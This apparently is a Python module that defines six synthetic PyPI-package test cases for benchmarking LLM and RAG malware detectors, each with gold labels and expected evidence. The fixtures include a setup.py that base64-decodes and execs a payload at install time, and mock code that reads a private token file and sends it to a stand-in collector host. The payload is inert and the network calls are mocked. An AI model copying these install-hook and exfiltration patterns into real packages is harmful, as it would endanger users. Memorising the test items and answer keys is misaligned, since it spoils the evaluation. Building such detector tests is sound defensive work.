"""Controlled test cases C01-C06 of `PyPI_Malware_LLM_RAG_KGRAG_Test_Cases.md`.

The code is the document's, unchanged where the document gives it. It calls a fake `mock_runtime`
module (no real file or network access); the `mock_runtime` ruleset (analysis/taxonomy.py) is switched
on through `meta.fixture_ruleset`, so real packages never see those rules. C02 is not spelled out in the
document; it is a setup.py that decodes and executes an inert base64 payload.

Labels follow the document: they hold only under the fixture's design assumptions. C06 has label
`unknown` (excluded from classification metrics) and expected verdict `uncertain` (abstention metric).
`required_evidence` is computed from marker strings, never typed by hand, so line numbers always match.
"""
from __future__ import annotations

import base64
from typing import Dict, List, Tuple

from ..schema import Sample, sha256_text
from .safe_io import files_from_texts

Q_STANDARD = ("Is this PyPI package malicious or benign based on the provided evidence? Identify relevant behavior "
              "and provide source-level evidence.")

_SETUP_PLAIN = '''from setuptools import setup

setup(
    name="{name}",
    version="1.0.0",
    packages=["{pkg}"],
    install_requires=[]
)
'''

_INERT = base64.b64encode(b"print('setup helper ready')  # synthetic fixture, inert").decode()

CASES: List[Dict] = [
    {
        "id": "C01", "name": "safe-math-utils", "label": "benign", "expected": "benign",
        "scenario": "Setup script thong thuong", "hypothesis": "LLM-only du dung", "difficulty": "plain_setup",
        "question": Q_STANDARD,
        "files": {
            "setup.py": _SETUP_PLAIN.format(name="safe-math-utils", pkg="safe_math"),
            "safe_math/__init__.py": "def add(a, b):\n    return a + b\n",
        },
        "gold_behaviors": [], "gold_paths": [], "gold_function_path": [],
        "markers": [("setup.py", "setup(")],
    },
    {
        "id": "C02", "name": "quick-setup-tools", "label": "malicious", "expected": "malicious",
        "scenario": "Dau hieu dang ngo truc tiep trong code", "hypothesis": "LLM-only co the nhan dien",
        "difficulty": "direct_signal", "question": "Which suspicious behaviors appear in the source?",
        "files": {
            "setup.py": ("import base64\nfrom setuptools import setup\n\n"
                         f"_PAYLOAD = \"{_INERT}\"\n"
                         "exec(base64.b64decode(_PAYLOAD))\n\n"
                         "setup(name=\"quick-setup-tools\", version=\"1.0.0\", packages=[\"quick_setup\"])\n"),
            "quick_setup/__init__.py": "",
        },
        "gold_behaviors": ["obfuscation", "code_exec", "install_hook"],
        "gold_paths": [["base64.b64decode", "builtins.exec"]], "gold_function_path": [],
        "markers": [("setup.py", "exec(base64.b64decode(_PAYLOAD))")],
    },
    {
        "id": "C03", "name": "token-sync-case", "label": "malicious", "expected": "malicious",
        "scenario": "Can kien thuc ve behavioral pattern", "hypothesis": "Text RAG co the co loi",
        "difficulty": "documented_pattern",
        "question": ("Does the package exhibit behavior consistent with a documented data-exfiltration pattern? "
                     "Provide matching evidence and explain its significance."),
        "files": {
            "setup.py": _SETUP_PLAIN.format(name="token-sync-case", pkg="token_sync"),
            "token_sync/__init__.py": "",
            "token_sync/installer.py": ('from mock_runtime import read_mock_file, send_mock_http\n\n'
                                        'def collect():\n'
                                        '    payload = read_mock_file("fixtures/private/token.txt")\n'
                                        '    send_mock_http("https://collector.invalid/upload", payload)\n'),
        },
        "gold_behaviors": ["file_read", "sensitive_data", "network_send", "data_exfiltration"],
        "gold_paths": [["mock_runtime.read_mock_file", "mock_runtime.send_mock_http"]], "gold_function_path": [],
        "markers": [("token_sync/installer.py", "read_mock_file(\"fixtures"), ("token_sync/installer.py", "send_mock_http(")],
    },
    {
        "id": "C04", "name": "report-uploader", "label": "benign", "expected": "benign",
        "scenario": "Doc file va gui HTTP hop le", "hypothesis": "Hybrid RAG co the giam false positive",
        "difficulty": "benign_sensitive_api",
        "question": "Should this package be classified as malicious merely because it reads a local file and sends an HTTP request?",
        "files": {
            "setup.py": _SETUP_PLAIN.format(name="report-uploader", pkg="report_tools"),
            "report_tools/__init__.py": "",
            "report_tools/uploader.py": ('from mock_runtime import read_mock_file, send_mock_http\n\n'
                                         'def upload_report(report_path, user_approved):\n'
                                         '    if not user_approved:\n'
                                         '        return "skipped"\n'
                                         '    data = read_mock_file(report_path)\n'
                                         '    send_mock_http("https://reports.invalid/api", data)\n'
                                         '    return "uploaded"\n'),
        },
        "gold_behaviors": ["file_read", "network_send"],
        "gold_paths": [["mock_runtime.read_mock_file", "mock_runtime.send_mock_http"]], "gold_function_path": [],
        "markers": [("report_tools/uploader.py", "if not user_approved"), ("report_tools/uploader.py", "read_mock_file(report_path)"),
                    ("report_tools/uploader.py", "send_mock_http(")],
    },
    {
        "id": "C05", "name": "synthetic-dataflow-case", "label": "malicious", "expected": "malicious",
        "scenario": "Doc du lieu nhay cam va truyen di qua nhieu file", "hypothesis": "KG-RAG co loi the tiem nang",
        "difficulty": "cross_file_data_flow",
        "question": ("Does sensitive data reach an external network destination? Identify the complete data-flow path "
                     "across the package and cite the relevant source lines."),
        "files": {
            "setup.py": _SETUP_PLAIN.format(name="synthetic-dataflow-case", pkg="demo_package"),
            "demo_package/__init__.py": "",
            "demo_package/reader.py": ('from mock_runtime import read_mock_file\n\n'
                                       'def load_secret():\n'
                                       '    return read_mock_file("fixtures/private/token.txt")\n'),
            "demo_package/processor.py": ('def prepare_payload(value):\n'
                                          '    return {"data": value}\n'),
            "demo_package/uploader.py": ('from mock_runtime import send_mock_http\n\n'
                                         'def submit(payload):\n'
                                         '    send_mock_http("https://collector.invalid/upload", payload)\n'),
            "demo_package/main.py": ('from .reader import load_secret\n'
                                     'from .processor import prepare_payload\n'
                                     'from .uploader import submit\n\n'
                                     'def run():\n'
                                     '    secret = load_secret()\n'
                                     '    payload = prepare_payload(secret)\n'
                                     '    submit(payload)\n'),
        },
        "gold_behaviors": ["file_read", "sensitive_data", "network_send", "data_exfiltration"],
        "gold_paths": [["mock_runtime.read_mock_file", "mock_runtime.send_mock_http"]],
        "gold_function_path": ["load_secret", "prepare_payload", "submit"],
        "markers": [("demo_package/reader.py", "return read_mock_file"), ("demo_package/processor.py", "return {\"data\""),
                    ("demo_package/uploader.py", "send_mock_http("), ("demo_package/main.py", "secret = load_secret()"),
                    ("demo_package/main.py", "payload = prepare_payload(secret)"), ("demo_package/main.py", "submit(payload)")],
    },
    {
        "id": "C06", "name": "plugin-runner-case", "label": "unknown", "expected": "uncertain",
        "scenario": "Dynamic dispatch, thieu config", "hypothesis": "Evidence verification nen uncertain",
        "difficulty": "dynamic_dispatch",
        "question": "Does this package transmit credentials to an external endpoint during execution?",
        "files": {
            "setup.py": _SETUP_PLAIN.format(name="plugin-runner-case", pkg="plugin_runner"),
            "plugin_runner/__init__.py": "",
            "plugin_runner/main.py": ('import importlib\n\n'
                                      'def run(config):\n'
                                      '    module = importlib.import_module(config["module"])\n'
                                      '    handler = getattr(module, config["handler"])\n'
                                      '    return handler()\n'),
        },
        "gold_behaviors": ["dynamic_import"], "gold_paths": [], "gold_function_path": [],
        "markers": [("plugin_runner/main.py", "importlib.import_module("), ("plugin_runner/main.py", "getattr(module")],
    },
]


def required_evidence(files: Dict[str, str], markers: List[Tuple[str, str]]) -> List[str]:
    """'path:line' for the first line of each file that contains the marker (raises when missing)."""
    out = []
    for path, marker in markers:
        for i, line in enumerate(files[path].splitlines(), 1):
            if marker in line:
                out.append(f"{path}:{i}")
                break
        else:
            raise ValueError(f"marker {marker!r} not found in {path}")
    return out


def make_cases() -> List[Sample]:
    out = []
    for c in CASES:
        fl = files_from_texts(c["files"])
        sha = sha256_text("\n".join(f"{f.path}:{f.sha256}" for f in fl))
        out.append(Sample(
            sample_id=f"case-{c['id']}", package_name=c["name"], version="1.0.0", label=c["label"], files=fl,
            label_source="synthetic_controlled_fixture", sha256=sha, split="test", source_ref="cases:C01-C06",
            family_group=f"case-{c['id']}", collection_timestamp="2026-11-10T00:00:00Z",
            meta={"case": c["id"], "difficulty": c["difficulty"], "question": c["question"], "fixture_ruleset": "mock_runtime"},
            gold={"gold_behaviors": c["gold_behaviors"], "gold_paths": c["gold_paths"],
                  "gold_function_path": c["gold_function_path"], "expected_verdict": c["expected"],
                  "required_evidence": required_evidence(c["files"], c["markers"]),
                  "scenario": c["scenario"], "hypothesis": c["hypothesis"]}))
    return out
